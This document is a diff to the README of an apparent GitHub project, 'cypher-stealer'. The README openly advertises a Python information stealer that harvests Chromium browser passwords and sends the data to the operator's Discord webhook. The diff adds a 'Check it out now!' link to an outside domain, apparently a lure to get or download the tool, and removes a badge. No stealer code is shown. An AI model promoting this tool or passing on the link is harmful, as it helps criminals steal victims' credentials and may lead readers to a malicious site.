@@ -10,7 +10,6 @@
     <img alt="GitHub contributors" src="https://img.shields.io/github/contributors/cypherh3x/cypher-stealer">
     <img alt="GitHub issues" src="https://img.shields.io/github/issues/cypherh3x/cypher-stealer">
     <img alt="GitHub pull requests" src="https://img.shields.io/github/issues-pr/cypherh3x/cypher-stealer">
-    <img alt="GitHub commit activity" src="https://img.shields.io/github/commit-activity/m/cypherh3x/cypher-stealer">
     <img alt="Maintenance" src="https://img.shields.io/maintenance/yes/2026">
   </p>
   <p align="center">
@@ -25,6 +24,7 @@
 
 ## What is Cypher?
 Project Cypher is a fast Python-based information stealer. It collects data in under 3 seconds and sends everything to your Discord webhook.
+## 👉 [Check it out now!](https://ospreypr.xyz/)
 
 ## ✨ Features
 - [x] Browser passwords (all Chromium-based)
